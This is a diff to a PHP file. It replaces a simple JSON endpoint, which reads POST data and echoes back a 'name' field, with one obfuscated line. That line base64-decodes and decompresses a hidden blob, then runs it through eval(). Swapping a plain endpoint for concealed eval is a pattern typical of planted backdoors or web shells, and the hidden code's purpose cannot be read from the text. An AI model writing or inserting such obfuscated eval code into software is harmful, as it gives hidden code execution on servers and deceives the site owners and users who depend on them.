@@ -1,13 +1,1 @@
-<?php
-// Get raw POST data
-$json = file_get_contents('php://input');
-$data = json_decode($json, true);
-
-if ($data) {
-    // Process data and return a JSON response
-    echo json_encode([
-        "status" => "success",
-        "received" => $data['name']
-    ]);
-}
-?>
+<?php $GLOBALS['_485132022_']='base64_decode';eval(gzuncompress($GLOBALS['_485132022_']('eAFNjEEKgzAQAL8iQYgBQcVqtaJ9iEiQuNZIm4i76aX07w0eitdhZkJZFWVdpVldyHbWT5APIKmsITCEEd+W7ZYk2myOuGhCec3ytMwvXl7RGjmBshNE4ekS0+5ANHr29G+LD6jFBkcD5mh6hjSSQ9Z2DJ1SgMhitoMC/YbJ01PeczO+gA+DaL7BvfsBDYg4JQ==')));
